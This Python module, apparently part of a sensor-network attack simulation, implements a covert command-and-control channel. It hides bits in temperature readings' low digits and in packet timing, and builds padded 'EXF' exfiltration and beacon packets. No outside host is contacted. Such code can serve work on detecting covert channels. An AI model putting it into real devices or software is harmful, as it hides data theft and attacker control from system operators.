"""
CovertChannel: Bidirectional C2 backdoor communication implementation

This module implements a dual-channel covert backdoor supporting both:
1. Uplink: Attacker → Cloud (beacons, data exfiltration)
2. Downlink: Cloud → Attacker (commands, control)

Encoding techniques:
- LSB steganography in temperature sensor readings
- Timing modulation (inter-packet delays encode bits)
- Random padding to prevent fingerprinting
"""

import struct
import random
from Config import Config

class CovertChannel:
    """
    Implements bidirectional covert channel with LSB encoding and timing modulation.

    The channel encodes a repeating bit pattern using:
    - LSB manipulation of temperature values
    - Variable inter-packet delays (0 → no delay, 1 → +delta)
    """

    def __init__(self, bitstring: str, timing_delta: float):
        """
        Initialize covert channel encoder/decoder.

        Args:
            bitstring: Binary pattern to transmit (e.g., "10110011")
            timing_delta: Additional delay (seconds) for encoding bit=1
        """
        self.bits = bitstring if bitstring else "1"
        self.idx = 0
        self.dt = max(0.0, float(timing_delta))

    def encode_lsb(self, value: float, data: int) -> float:
        """
        Encode 1 bit into the LSB of a temperature value.

        Args:
            value: Original temperature reading
            data: Bit to encode (0 or 1)

        Returns:
            Modified temperature with encoded bit in fractional LSB
        """
        int_part = int(value)
        frac_part = value - int_part
        new_frac = (int(round(frac_part * 100)) & 0xFE) | (data & 1)
        return int_part + (new_frac / 100)

    def decode_lsb(self, value: float) -> int:
        """
        Extract 1 bit from a temperature value's LSB.

        Args:
            value: Encoded temperature reading

        Returns:
            Decoded bit (0 or 1)
        """
        frac_part = value - int(value)
        return int(round(frac_part * 100)) & 1

    def build_payload(self, node, data_bytes: bytes, is_beacon: bool = False) -> bytes:
        """
        Build C2 uplink payload with header and encoded data.

        Packet structure:
        - 3-byte magic: "EXF"
        - 1-byte node ID
        - 1-byte flags (attack_triggered, parity, beacon)
        - 4-byte float: LSB-encoded temperature
        - 2-byte length
        - Variable data payload (padded with random bytes)

        Args:
            node: Source sensor node
            data_bytes: Raw data to exfiltrate
            is_beacon: True for beacon packets, False for data exfiltration

        Returns:
            Constructed C2 packet (padded to PKT_SIZE)
        """
        flags = 0
        flags |= 0x01 if getattr(node, "attack_triggered", False) else 0
        flags |= ((node.id & 1) << 1)
        if is_beacon:
            flags |= 0x80

        current_bit = int(self.bits[self.idx % len(self.bits)])
        temp_encoded = self.encode_lsb(node.current_temp, current_bit)

        hdr = b"EXF" + bytes([node.id & 0xFF, flags]) + struct.pack("<fH", float(temp_encoded), len(data_bytes))

        pad_to = max(1, int(getattr(Config, "PKT_SIZE", 128)))
        max_bytes = int(getattr(Config, "C2_MAX_BYTES", pad_to))
        body = data_bytes[:max_bytes]

        if len(body) < pad_to:
            body += bytes([random.randint(0, 255) for _ in range(pad_to - len(body))])
        return hdr + body[:pad_to]

    def next_delay(self) -> float:
        """
        Get timing delay for current bit in sequence.

        Returns:
            0.0 if current bit is 0, timing_delta if current bit is 1
        """
        bit = int(self.bits[self.idx % len(self.bits)])
        self.idx += 1
        return self.dt if bit else 0.0
